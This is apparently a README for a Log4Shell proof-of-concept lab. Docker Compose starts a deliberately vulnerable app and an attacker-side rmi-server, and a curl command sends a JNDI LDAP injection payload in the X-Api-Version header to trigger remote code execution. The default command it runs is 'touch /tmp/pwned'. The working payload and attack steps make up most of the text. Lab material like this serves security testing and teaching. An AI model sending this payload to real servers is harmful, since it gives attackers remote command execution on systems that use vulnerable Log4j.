log4shell POC

# Steps

1. Build the images
```bash
docker-compose build
```

2. config the command in `.env`, default is `touch /tmp/pwned`

3. Compose!
```bash
docker-compose up -d
```

4. The vuluerable app is up and bind 8080 to the host machine.
To get the ldap payload, please see the log of the container `rmi-server`.

![get_payload](images/get_payload.png)

and make a request, e.g.

```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://rmi-server:1389/7mqfuh}'
```

5. Check the result, go to the console of the app.

![result](images/result.png)
